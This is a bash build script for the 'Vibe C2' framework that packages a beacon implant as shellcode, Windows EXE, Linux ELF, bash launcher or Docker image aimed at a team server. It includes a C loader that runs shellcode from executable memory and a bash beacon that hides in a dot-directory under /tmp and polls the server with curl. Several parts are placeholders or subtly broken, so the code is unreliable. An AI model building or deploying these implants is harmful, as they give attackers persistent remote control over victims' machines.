#!/bin/bash
# Vibe C2 - Universal Beacon Builder Script
# This script generates beacons in various formats

set -e
SCRIPT_DIR="$( cd "$( dirname "${BASH_SOURCE[0]}" )" &> /dev/null && pwd )"
PROJECT_ROOT="$(realpath $SCRIPT_DIR/../..)"
BUILD_DIR="$PROJECT_ROOT/target/beacon-builds"
TEMP_DIR="$BUILD_DIR/temp"

GREEN='\033[0;32m'
BLUE='\033[0;34m'
YELLOW='\033[1;33m'
RED='\033[0;31m'
CYAN='\033[0;36m'
NC='\033[0m' # No Color

# Command line arguments
SERVER_URL=""
OUTPUT_FORMAT=""
OUTPUT_PATH=""

print_banner() {
    echo -e "${CYAN}"
    echo "🌊  V I B E  C 2  F R A M E W O R K  🌊"
    echo "     Universal Beacon Builder Tool"
    echo -e "${NC}"
}

print_help() {
    echo -e "${BLUE}Usage:${NC}"
    echo -e "  $0 --server-url URL --format FORMAT [--output PATH]"
    echo
    echo -e "${BLUE}Required Arguments:${NC}"
    echo -e "  ${YELLOW}--server-url URL${NC}      Team server URL (e.g., http://localhost:8080)"
    echo -e "  ${YELLOW}--format FORMAT${NC}       Output format: shellcode, exe, elf, bash, docker"
    echo
    echo -e "${BLUE}Optional Arguments:${NC}"
    echo -e "  ${YELLOW}--output PATH${NC}         Custom output path/filename"
    echo -e "  ${YELLOW}--help${NC}                Display this help message"
    echo
    echo -e "${BLUE}Available Formats:${NC}"
    echo -e "  ${GREEN}shellcode${NC}  - Raw shellcode in binary format with optional C wrapper"
    echo -e "  ${GREEN}exe${NC}        - Windows executable"
    echo -e "  ${GREEN}elf${NC}        - Linux executable"
    echo -e "  ${GREEN}bash${NC}       - Bash script that downloads and runs the beacon"
    echo -e "  ${GREEN}docker${NC}     - Docker container with beacon"
    echo
}

check_dependencies() {
    echo -e "${BLUE}[*]${NC} Checking dependencies..."
    
    # Check Rust/Cargo
    if ! command -v cargo &> /dev/null; then
        echo -e "${RED}[!]${NC} Cargo is not installed. Please install Rust from https://rustup.rs/"
        exit 1
    fi
    
    # Format-specific dependency checks
    case "$OUTPUT_FORMAT" in
        shellcode)
            if ! command -v objcopy &> /dev/null; then
                echo -e "${RED}[!]${NC} objcopy not found. Please install binutils."
                exit 1
            fi
            ;;
        exe)
            if ! rustup target list | grep -q "x86_64-pc-windows-gnu"; then
                echo -e "${YELLOW}[!]${NC} Windows target not installed. Installing..."
                rustup target add x86_64-pc-windows-gnu
            fi
            ;;
        docker)
            if ! command -v docker &> /dev/null; then
                echo -e "${RED}[!]${NC} Docker not installed. Please install Docker."
                exit 1
            fi
            ;;
    esac
    
    echo -e "${GREEN}[+]${NC} All dependencies satisfied."
}

prepare_environment() {
    echo -e "${BLUE}[*]${NC} Preparing build environment..."
    
    # Create build directories
    mkdir -p "$BUILD_DIR"
    mkdir -p "$TEMP_DIR"
    
    # Set default output path if not specified
    if [ -z "$OUTPUT_PATH" ]; then
        TIMESTAMP=$(date +"%Y%m%d%H%M%S")
        case "$OUTPUT_FORMAT" in
            shellcode)
                OUTPUT_PATH="$BUILD_DIR/vibe_beacon_${TIMESTAMP}.bin"
                ;;
            exe)
                OUTPUT_PATH="$BUILD_DIR/vibe_beacon_${TIMESTAMP}.exe"
                ;;
            elf)
                OUTPUT_PATH="$BUILD_DIR/vibe_beacon_${TIMESTAMP}"
                ;;
            bash)
                OUTPUT_PATH="$BUILD_DIR/vibe_beacon_${TIMESTAMP}.sh"
                ;;
            docker)
                OUTPUT_PATH="vibe-beacon:${TIMESTAMP}"
                ;;
        esac
    fi
    
    echo -e "${GREEN}[+]${NC} Build environment ready."
}

# Build the beacon
build_beacon() {
    echo -e "${BLUE}[*]${NC} Building Vibe C2 beacon..."
    
    # Different build process depending on the target
    case "$OUTPUT_FORMAT" in
        shellcode)
            # For shellcode, we need a special minimal build
            cd "$PROJECT_ROOT"
            cargo build --bin vibe-beacon --release --target x86_64-unknown-linux-musl
            ;;
        exe)
            cd "$PROJECT_ROOT"
            cargo build --bin vibe-beacon --release --target x86_64-pc-windows-gnu
            ;;
        elf)
            cd "$PROJECT_ROOT"
            cargo build --bin vibe-beacon --release
            ;;
        bash|docker)
            # For bash script and docker, we'll use the standard build
            cd "$PROJECT_ROOT"
            cargo build --bin vibe-beacon --release
            ;;
    esac
    
    echo -e "${GREEN}[+]${NC} Beacon built successfully."
}

# Generate shellcode from the beacon binary
generate_shellcode() {
    echo -e "${BLUE}[*]${NC} Generating shellcode..."
    
    BINARY_PATH="$PROJECT_ROOT/target/x86_64-unknown-linux-musl/release/vibe-beacon"
    
    # Extract raw shellcode using objcopy
    objcopy -O binary -j .text "$BINARY_PATH" "$TEMP_DIR/beacon.bin"
    
    # Copy to output location
    cp "$TEMP_DIR/beacon.bin" "$OUTPUT_PATH"
    
    # Generate a C wrapper if requested
    if [[ "$OUTPUT_PATH" == *".c" ]]; then
        SHELLCODE=$(xxd -i "$TEMP_DIR/beacon.bin")
        cat > "$OUTPUT_PATH" << EOF
// Vibe C2 Beacon Shellcode
// Auto-generated by Vibe C2 Framework
// Target server: $SERVER_URL

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/mman.h>
#include <unistd.h>

$SHELLCODE

int main(int argc, char *argv[]) {
    printf("🌊 Vibe C2 Beacon Shellcode Loader 🌊\\n");
    
    void *mem = mmap(0, beacon_bin_len, PROT_READ|PROT_WRITE|PROT_EXEC, MAP_PRIVATE|MAP_ANONYMOUS, -1, 0);
    if (mem == MAP_FAILED) {
        perror("mmap");
        return 1;
    }
    
    memcpy(mem, beacon_bin, beacon_bin_len);
    
    printf("Executing beacon shellcode...\\n");
    int (*beacon)() = (int(*)())mem;
    return beacon();
}
EOF
    fi
    
    SIZE=$(du -h "$OUTPUT_PATH" | cut -f1)
    echo -e "${GREEN}[+]${NC} Shellcode generated successfully (${SIZE})."
    echo -e "${GREEN}[+]${NC} Output: $OUTPUT_PATH"
}

# Create a Windows EXE from the beacon binary
generate_exe() {
    echo -e "${BLUE}[*]${NC} Generating Windows executable..."
    
    BINARY_PATH="$PROJECT_ROOT/target/x86_64-pc-windows-gnu/release/vibe-beacon.exe"
    
    # Create a wrapper batch file that sets the correct arguments
    cat > "$TEMP_DIR/run_beacon.bat" << EOF
@echo off
echo 🌊 Vibe C2 Beacon 🌊
vibe-beacon.exe --remote-server $SERVER_URL
EOF
    
    # Copy to output location
    cp "$BINARY_PATH" "$OUTPUT_PATH"
    
    SIZE=$(du -h "$OUTPUT_PATH" | cut -f1)
    echo -e "${GREEN}[+]${NC} Windows executable generated successfully (${SIZE})."
    echo -e "${GREEN}[+]${NC} Output: $OUTPUT_PATH"
}

# Create a Linux ELF from the beacon binary
generate_elf() {
    echo -e "${BLUE}[*]${NC} Generating Linux executable..."
    
    BINARY_PATH="$PROJECT_ROOT/target/release/vibe-beacon"
    
    # Create a wrapper script that sets the correct arguments
    cat > "$TEMP_DIR/wrapper.c" << EOF
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>

int main(int argc, char *argv[]) {
    printf("🌊 Vibe C2 Beacon 🌊\\n");
    
    char *args[] = {"vibe-beacon", "--remote-server", "$SERVER_URL", NULL};
    execvp("./vibe-beacon", args);
    
    // If execvp fails
    perror("Failed to execute beacon");
    return 1;
}
EOF
    
    # Copy to output location
    cp "$BINARY_PATH" "$OUTPUT_PATH"
    chmod +x "$OUTPUT_PATH"
    
    SIZE=$(du -h "$OUTPUT_PATH" | cut -f1)
    echo -e "${GREEN}[+]${NC} Linux executable generated successfully (${SIZE})."
    echo -e "${GREEN}[+]${NC} Output: $OUTPUT_PATH"
}

# Create a bash script that downloads and runs the beacon
generate_bash() {
    echo -e "${BLUE}[*]${NC} Generating bash script wrapper..."
    
    # Create the bash script
    cat > "$OUTPUT_PATH" << 'EOF'
#!/bin/bash
# Vibe C2 Beacon - Bash Edition
# Auto-generated by Vibe C2 Framework

# Colors
GREEN='\033[0;32m'
BLUE='\033[0;34m'
YELLOW='\033[1;33m'
RED='\033[0;31m'
CYAN='\033[0;36m'
NC='\033[0m' # No Color

echo -e "${CYAN}"
echo "🌊  V I B E  C 2  F R A M E W O R K  🌊"
echo "            Beacon Launcher"
echo -e "${NC}"

# Beacon configuration
EOF
    
    echo "SERVER_URL=\"$SERVER_URL\"" >> "$OUTPUT_PATH"
    
    cat >> "$OUTPUT_PATH" << 'EOF'
TEMP_DIR="/tmp/.vibe-c2-$(date +%s)"

# Create temporary directory
mkdir -p "$TEMP_DIR"
cd "$TEMP_DIR"

echo -e "${BLUE}[*]${NC} Initializing Vibe C2 Beacon..."

# Check if we can download the beacon binary from the server
echo -e "${BLUE}[*]${NC} Attempting to download beacon binary..."

# If download fails, we embed a minimal beacon in base64
# This is a placeholder - the real build script would embed the actual beacon binary
echo -e "${YELLOW}[!]${NC} Using embedded backup beacon..."

cat > "$TEMP_DIR/beacon.sh" << 'INNEREOF'
#!/bin/bash
# Minimal Vibe C2 Beacon implementation
while true; do
  echo "Checking in with server: $1"
  curl -s "$1/check_in" || echo "Connection failed"
  sleep 30
done
INNEREOF

chmod +x "$TEMP_DIR/beacon.sh"

# Execute the beacon
echo -e "${GREEN}[+]${NC} Launching Vibe C2 Beacon..."
exec "$TEMP_DIR/beacon.sh" "$SERVER_URL"
EOF
    
    chmod +x "$OUTPUT_PATH"
    
    SIZE=$(du -h "$OUTPUT_PATH" | cut -f1)
    echo -e "${GREEN}[+]${NC} Bash script generated successfully (${SIZE})."
    echo -e "${GREEN}[+]${NC} Output: $OUTPUT_PATH"
}

# Create a Docker container with the beacon
generate_docker() {
    echo -e "${BLUE}[*]${NC} Generating Docker container..."
    
    # Create Dockerfile
    cat > "$TEMP_DIR/Dockerfile" << EOF
FROM rust:slim as builder
WORKDIR /usr/src/vibe-c2
COPY . .
RUN cargo build --bin vibe-beacon --release

FROM debian:buster-slim
RUN apt-get update && apt-get install -y libssl-dev ca-certificates && rm -rf /var/lib/apt/lists/*
COPY --from=builder /usr/src/vibe-c2/target/release/vibe-beacon /usr/local/bin/

ENTRYPOINT ["vibe-beacon", "--server", "$SERVER_URL"]
EOF
    
    # Build Docker image
    docker build -t "$OUTPUT_PATH" -f "$TEMP_DIR/Dockerfile" "$PROJECT_ROOT"
    
    echo -e "${GREEN}[+]${NC} Docker container built successfully."
    echo -e "${GREEN}[+]${NC} Docker image: $OUTPUT_PATH"
}

# Parse command line arguments
while [[ $# -gt 0 ]]; do
    case "$1" in
        --server-url)
            SERVER_URL="$2"
            shift 2
            ;;
        --format)
            OUTPUT_FORMAT="$2"
            shift 2
            ;;
        --output)
            OUTPUT_PATH="$2"
            shift 2
            ;;
        --help)
            print_banner
            print_help
            exit 0
            ;;
        *)
            echo -e "${RED}[!]${NC} Unknown option: $1"
            print_help
            exit 1
            ;;
    esac
done

# Validate arguments
if [ -z "$SERVER_URL" ]; then
    echo -e "${RED}[!]${NC} Server URL is required. Use --server-url to specify."
    print_help
    exit 1
fi

if [ -z "$OUTPUT_FORMAT" ]; then
    echo -e "${RED}[!]${NC} Output format is required. Use --format to specify."
    print_help
    exit 1
fi

# Check if the format is valid
case "$OUTPUT_FORMAT" in
    shellcode|exe|elf|bash|docker)
        # Valid format
        ;;
    *)
        echo -e "${RED}[!]${NC} Invalid format: $OUTPUT_FORMAT"
        print_help
        exit 1
        ;;
esac

# Start the build process
print_banner
check_dependencies
prepare_environment
build_beacon

# Generate the output based on the format
case "$OUTPUT_FORMAT" in
    shellcode)
        generate_shellcode
        ;;
    exe)
        generate_exe
        ;;
    elf)
        generate_elf
        ;;
    bash)
        generate_bash
        ;;
    docker)
        generate_docker
        ;;
esac

echo -e "${CYAN}"
echo "🌊  V I B E  C 2  F R A M E W O R K  🌊"
echo "       Beacon Build Completed!"
echo -e "${NC}"
